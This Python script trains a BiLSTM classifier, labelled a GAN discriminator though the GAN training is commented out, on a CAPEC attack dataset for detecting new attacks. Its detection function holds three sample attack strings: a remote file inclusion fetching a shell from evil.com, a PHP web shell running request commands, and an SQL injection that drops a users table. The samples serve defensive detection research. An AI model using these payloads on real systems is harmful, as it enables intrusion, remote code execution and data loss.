import os
import sys
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
import pickle
import time
from sklearn.preprocessing import LabelEncoder
from sklearn.metrics import confusion_matrix, classification_report, accuracy_score
from tensorflow.keras.preprocessing.text import Tokenizer
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.models import Sequential, Model
from tensorflow.keras.layers import Embedding, LSTM, Dense, Dropout, Input, GRU, Bidirectional
from tensorflow.keras.optimizers import Adam
from tensorflow.keras.utils import to_categorical
import tensorflow as tf
import warnings
warnings.filterwarnings('ignore')

# Set random seeds for reproducibility
np.random.seed(42)
tf.random.set_seed(42)

# Configure matplotlib for better visualizations
plt.style.use('ggplot')
plt.rcParams['figure.figsize'] = (12, 8)
plt.rcParams['font.size'] = 12

# Create directory if it doesn't exist
gan_result_dir = 'Results/gan_capec_transfer'
os.makedirs(gan_result_dir, exist_ok=True)

class ArgmaxLayer(tf.keras.layers.Layer):
    def call(self, inputs):
        return tf.argmax(inputs, axis=-1, output_type=tf.int32)

def load_data():
    """Load and prepare the CAPEC transfer dataset"""
    print("Loading CAPEC transfer dataset...")
    dataset_path = 'Dataset/dataset_capec_transfer.csv'
    df = pd.read_csv(dataset_path)
    texts = df['text'].astype(str).values
    labels = df['label'].values
    
    # Encode labels
    label_encoder = LabelEncoder()
    encoded_labels = label_encoder.fit_transform(labels)
    
    # Print class distribution
    unique_labels, counts = np.unique(labels, return_counts=True)
    print("Class distribution:")
    for label, count in zip(unique_labels, counts):
        print(f"  {label}: {count}")
    
    # Split data into training and testing sets (80/20)
    indices = np.random.permutation(len(texts))
    train_size = int(0.8 * len(texts))
    train_indices = indices[:train_size]
    test_indices = indices[train_size:]
    
    X_train = texts[train_indices]
    y_train = encoded_labels[train_indices]
    X_test = texts[test_indices]
    y_test = encoded_labels[test_indices]
    
    print(f"Training samples: {len(X_train)}")
    print(f"Testing samples: {len(X_test)}")
    print(f"Number of classes: {len(label_encoder.classes_)}")
    
    return X_train, X_test, y_train, y_test, label_encoder

def preprocess_text(X_train, X_test):
    """Tokenize and preprocess text data"""
    # Tokenization parameters
    max_words = 10000
    max_len = 150
    
    tokenizer = Tokenizer(num_words=max_words)
    tokenizer.fit_on_texts(X_train)
    
    X_train_seq = tokenizer.texts_to_sequences(X_train)
    X_test_seq = tokenizer.texts_to_sequences(X_test)
    
    X_train_pad = pad_sequences(X_train_seq, maxlen=max_len)
    X_test_pad = pad_sequences(X_test_seq, maxlen=max_len)
    
    return X_train_pad, X_test_pad, tokenizer, max_words, max_len

def build_generator(max_words, max_len, latent_dim, num_classes):
    """Build the generator model"""
    # Import needed layers
    from tensorflow.keras.layers import Concatenate, Flatten, Reshape
    
    noise_input = Input(shape=(latent_dim,))
    label_input = Input(shape=(1,))
    
    # Embedding for label input
    label_embedding = Embedding(num_classes, 50)(label_input)
    label_embedding = Dense(latent_dim)(Flatten()(label_embedding))
    
    # Combine noise and label
    combined_input = Concatenate()([noise_input, label_embedding])
    
    x = Dense(128, activation='relu')(combined_input)
    x = Dense(256, activation='relu')(x)
    x = Dense(max_len * max_words)(x)
    x = Reshape((max_len, max_words))(x)
    
    # Use the custom ArgmaxLayer
    output = ArgmaxLayer()(x)
    
    model = Model([noise_input, label_input], output)
    return model

def build_discriminator(max_words, max_len, num_classes):
    """Build the discriminator model"""
    text_input = Input(shape=(max_len,))
    
    # Embedding layer
    x = Embedding(max_words, 128, input_length=max_len)(text_input)
    
    # BiLSTM layers
    x = Bidirectional(LSTM(256, return_sequences=True))(x)
    x = Bidirectional(LSTM(128))(x)
    
    # Dense layers
    x = Dense(64, activation='relu')(x)
    x = Dropout(0.5)(x)
    
    # Output for classification
    output = Dense(num_classes, activation='softmax')(x)
    
    model = Model(text_input, output)
    model.compile(loss='sparse_categorical_crossentropy',
                 optimizer=Adam(learning_rate=1e-4),
                 metrics=['accuracy'])
    
    return model

def train_gan_model(X_train, X_test, y_train, y_test, label_encoder):
    """Train and evaluate GAN model"""
    print("\n" + "="*50)
    print("Training GAN model on CAPEC transfer dataset...")
    print("="*50)
    
    # Preprocess text
    X_train_pad, X_test_pad, tokenizer, max_words, max_len = preprocess_text(X_train, X_test)
    
    # Convert labels to categorical for discriminator
    num_classes = len(label_encoder.classes_)
    
    # Build discriminator (classifier)
    discriminator = build_discriminator(max_words, max_len, num_classes)
    print(discriminator.summary())
    
    # Build generator
    latent_dim = 100
    generator = build_generator(max_words, max_len, latent_dim, num_classes)
    
    # Configure GAN
    discriminator.trainable = False
    noise_input = Input(shape=(latent_dim,))
    label_input = Input(shape=(1,))
    
    # Generate fake samples
    generated_samples = generator([noise_input, label_input])
    
    # Classification of generated samples
    gan_output = discriminator(generated_samples)
    
    # Combined GAN model
    gan = Model([noise_input, label_input], gan_output)
    gan.compile(loss='sparse_categorical_crossentropy', optimizer=Adam(learning_rate=1e-4))
    
    # Training parameters
    batch_size = 32
    epochs = 20 # Increase epochs
    # steps_per_epoch = X_train_pad.shape[0] // batch_size # Not needed for direct discriminator training
    
    # Training loop - ONLY TRAIN DISCRIMINATOR FOR SIMPLICITY
    start_time = time.time()
    
    print("\n" + "="*50)
    print("Training Discriminator (Classifier) model...")
    print("="*50)
    
    # Add Early Stopping callback
    early_stopping = tf.keras.callbacks.EarlyStopping(
        monitor='val_loss', # Monitor validation loss
        patience=5, # Stop after 5 epochs with no improvement
        restore_best_weights=True # Restore best weights
    )
    
    history = discriminator.fit(
        X_train_pad, y_train,
        validation_split=0.1, # Use a validation split for monitoring
        epochs=epochs,
        batch_size=batch_size,
        verbose=1, # Show training progress
        callbacks=[early_stopping] # Add callbacks
    )
    
    # for epoch in range(epochs):
    #     print(f"\nEpoch {epoch+1}/{epochs}")
        
    #     for step in range(steps_per_epoch):
    #         # Get batch of real data
    #         idx = np.random.randint(0, X_train_pad.shape[0], batch_size)
    #         real_samples = X_train_pad[idx]
    #         real_labels = y_train[idx]
            
    #         # Generate fake data
    #         noise = np.random.normal(0, 1, (batch_size, latent_dim))
    #         fake_labels = np.random.randint(0, num_classes, batch_size).reshape(-1, 1)
            
    #         # Generate fake samples
    #         fake_samples = generator.predict([noise, fake_labels], verbose=0)
            
    #         # Train discriminator
    #         d_loss_real = discriminator.train_on_batch(real_samples, real_labels)
    #         d_loss_fake = discriminator.train_on_batch(fake_samples, fake_labels.flatten())
            
    #         # Train generator to fool discriminator (THIS PART IS COMMENTED OUT)
    #         # noise = np.random.normal(0, 1, (batch_size, latent_dim))
    #         # target_labels = np.random.randint(0, num_classes, batch_size).reshape(-1, 1)
            
    #         # g_loss = gan.train_on_batch([noise, target_labels], target_labels.flatten())
            
    #         # Print progress
    #         # if step % 20 == 0:
    #         #     print(f"  Step {step}/{steps_per_epoch} - D real loss: {d_loss_real[0]:.4f}, D fake loss: {d_loss_fake[0]:.4f}") # Removed G loss
    
    training_time = time.time() - start_time
    print(f"Discriminator model training completed in {training_time:.2f} seconds")
    
    # Evaluate discriminator
    print("\n" + "="*50)
    print("Evaluating Discriminator model...")
    print("="*50)
    loss, accuracy = discriminator.evaluate(X_test_pad, y_test, verbose=1)
    print(f"Test Loss: {loss:.4f}")
    print(f"Test Accuracy: {accuracy:.4f}")
    
    # Predictions
    y_pred_probs = discriminator.predict(X_test_pad)
    y_pred = np.argmax(y_pred_probs, axis=1)
    
    # Save models
    generator.save(os.path.join(gan_result_dir, 'generator_model.h5'))
    discriminator.save(os.path.join(gan_result_dir, 'discriminator_model.h5'))
    
    # Save tokenizer
    with open(os.path.join(gan_result_dir, 'gan_tokenizer.pkl'), 'wb') as f:
        pickle.dump(tokenizer, f)
    
    # Save label mapping
    with open(os.path.join(gan_result_dir, 'label_mapping.pkl'), 'wb') as f:
        pickle.dump(label_encoder, f)
    
    # Save results
    results = {
        'accuracy': accuracy,
        'loss': loss,
        'training_time': training_time,
        'y_true': y_test,
        'y_pred': y_pred,
        'class_names': label_encoder.classes_
    }
    
    with open(os.path.join(gan_result_dir, 'gan_results.pkl'), 'wb') as f:
        pickle.dump(results, f)
    
    # Create visualizations
    # Use history from discriminator training for plotting
    create_gan_visualizations(history, y_test, y_pred, label_encoder)
    
    return results

def create_gan_visualizations(history, y_true, y_pred, label_encoder):
    """Create and save visualizations for GAN model"""
    print("Creating Discriminator visualizations...")
    
    # Plot training history (using history object)
    plt.figure(figsize=(12, 5))
    plt.subplot(1, 2, 1)
    plt.plot(history.history['accuracy'])
    plt.plot(history.history['val_accuracy'])
    plt.title('Discriminator Model Accuracy')
    plt.ylabel('Accuracy')
    plt.xlabel('Epoch')
    plt.legend(['Train', 'Validation'], loc='lower right')
    
    plt.subplot(1, 2, 2)
    plt.plot(history.history['loss'])
    plt.plot(history.history['val_loss'])
    plt.title('Discriminator Model Loss')
    plt.ylabel('Loss')
    plt.xlabel('Epoch')
    plt.legend(['Train', 'Validation'], loc='upper right')
    plt.tight_layout()
    plt.savefig(os.path.join(gan_result_dir, 'discriminator_history.png'))
    
    # Create confusion matrix (using y_true and y_pred)
    class_names = label_encoder.classes_
    cm = confusion_matrix(y_true, y_pred)
    plt.figure(figsize=(12, 10))
    sns.heatmap(cm, annot=True, fmt='d', cmap='Blues',
                xticklabels=class_names,
                yticklabels=class_names)
    plt.title('GAN Confusion Matrix')
    plt.ylabel('True Label')
    plt.xlabel('Predicted Label')
    plt.xticks(rotation=45, ha='right')
    plt.tight_layout()
    plt.savefig(os.path.join(gan_result_dir, 'gan_confusion_matrix.png'))
    
    # Create classification report visualization
    report = classification_report(y_true, y_pred, target_names=class_names, output_dict=True)
    report_df = pd.DataFrame(report).transpose()
    
    plt.figure(figsize=(12, 10))
    sns.heatmap(report_df.iloc[:-3, :3].astype(float), annot=True, cmap='Blues')
    plt.title('GAN Classification Report')
    plt.tight_layout()
    plt.savefig(os.path.join(gan_result_dir, 'gan_classification_report.png'))
    
    # Create accuracy chart
    plt.figure(figsize=(10, 6))
    accuracy = accuracy_score(y_true, y_pred)
    plt.bar(['GAN Discriminator'], [accuracy], color='steelblue')
    plt.title('GAN Discriminator Accuracy on CAPEC Transfer Dataset')
    plt.ylabel('Accuracy')
    plt.ylim(0, 1.0)
    for i, v in enumerate([accuracy]):
        plt.text(i, v + 0.02, f"{v:.4f}", ha='center')
    plt.tight_layout()
    plt.savefig(os.path.join(gan_result_dir, 'gan_accuracy.png'))
    
    print("GAN visualizations saved to", gan_result_dir)

def detect_new_attacks(model, tokenizer, max_len, label_encoder):
    """Function to detect new attacks using anomaly scores from GAN"""
    # Simulate some new attack data
    new_attacks = [
        "GET /admin/config.php?_SERVER[DOCUMENT_ROOT]=http://evil.com/shell.txt?",
        "POST /process.php Content-Length: 0\r\n\r\n<?php system($_GET['cmd']); ?>",
        "GET /search.php?q=1';DROP TABLE users;--"
    ]
    
    # Tokenize and pad new attacks
    new_attacks_seq = tokenizer.texts_to_sequences(new_attacks)
    new_attacks_pad = pad_sequences(new_attacks_seq, maxlen=max_len)
    
    # Get predictions
    predictions = model.predict(new_attacks_pad)
    
    # Calculate anomaly scores
    # Lower confidence or entropy could indicate anomalous/new attacks
    confidences = np.max(predictions, axis=1)
    entropies = -np.sum(predictions * np.log2(predictions + 1e-10), axis=1)
    
    # Determine anomaly threshold
    threshold = 0.7  # Adjust based on experimentation
    
    # Results
    results = []
    for i, attack in enumerate(new_attacks):
        pred_class = np.argmax(predictions[i])
        pred_label = label_encoder.classes_[pred_class]
        confidence = confidences[i]
        entropy = entropies[i]
        is_anomaly = confidence < threshold
        
        results.append({
            'attack': attack,
            'predicted_label': pred_label,
            'confidence': confidence,
            'entropy': entropy,
            'is_anomaly': is_anomaly
        })
    
    # Print results
    print("\n" + "="*80)
    print("New Attack Detection Results:")
    print("="*80)
    for i, result in enumerate(results):
        status = "ANOMALY DETECTED" if result['is_anomaly'] else "Normal"
        print(f"Attack {i+1}: {result['attack'][:50]}...")
        print(f"  Predicted as: {result['predicted_label']}")
        print(f"  Confidence: {result['confidence']:.4f}")
        print(f"  Entropy: {result['entropy']:.4f}")
        print(f"  Status: {status}")
        print("-"*80)
    
    # Save results
    with open(os.path.join(gan_result_dir, 'new_attack_detection.pkl'), 'wb') as f:
        pickle.dump(results, f)
    
    return results

def main():
    """Main function to run the GAN model on CAPEC transfer dataset"""
    print("=" * 80)
    print("Running GAN model on CAPEC transfer dataset for detecting new attacks")
    print("=" * 80)
    
    # Load data
    X_train, X_test, y_train, y_test, label_encoder = load_data()
    
    # Train GAN model (Discriminator only)
    results = train_gan_model(X_train, X_test, y_train, y_test, label_encoder)
    
    # Print summary
    if results:
        print("\n" + "="*50)
        print("Training Summary:")
        print("="*50)
        print(f"Discriminator Accuracy: {results['accuracy']:.4f}")
        print(f"Discriminator Training Time: {results['training_time']:.2f} seconds")
        
        # Preprocess for new attack detection (using tokenizer from training)
        # Need to reload tokenizer if main is run separately after training
        # For simplicity here, assuming tokenizer is available from train_gan_model scope
        # In a real scenario, you'd load the saved tokenizer
        # For now, let's reuse the one from train_gan_model for the detect_new_attacks part
        # This requires making tokenizer, max_len, max_words available here or reloading
        # Simplest for now is to just preprocess again to get the tokenizer and max_len
        _, _, tokenizer, max_words, max_len = preprocess_text(X_train, X_test)
        
        # Load discriminator model for detection
        # In a real scenario, you'd load the saved model
        # For now, use the trained discriminator object directly
        # This requires making discriminator available here
        # Simplest for now is to reload the saved model
        discriminator = tf.keras.models.load_model(os.path.join(gan_result_dir, 'discriminator_model.h5'))
        
        # Detect new attacks
        detect_new_attacks(discriminator, tokenizer, max_len, label_encoder)
        
        print("=" * 80)
        print("Results and visualizations saved to:")
        print(f"- GAN: {gan_result_dir}")
        print("=" * 80)
    else:
        print("Discriminator model training failed. Check logs for details.")

if __name__ == "__main__":
    # Fix TensorFlow memory issues
    gpus = tf.config.experimental.list_physical_devices('GPU')
    if gpus:
        try:
            for gpu in gpus:
                tf.config.experimental.set_memory_growth(gpu, True)
        except RuntimeError as e:
            print(e)
    
    # Import needed only for generator - moved inside build_generator
    # from tensorflow.keras.layers import Concatenate, Flatten, Reshape
    
    main() 